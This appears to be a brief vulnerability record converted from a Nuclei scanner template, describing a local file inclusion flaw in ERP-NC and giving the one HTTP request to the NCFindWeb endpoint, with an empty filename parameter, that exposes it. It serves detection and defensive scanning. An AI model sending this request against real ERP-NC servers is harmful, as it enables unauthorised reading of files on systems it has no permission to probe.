# Vulnerability: ERP-NC - Local File Inclusion
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`erp-nc-directory-traversal.yaml`)

## Description
ERP-NC is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=
```

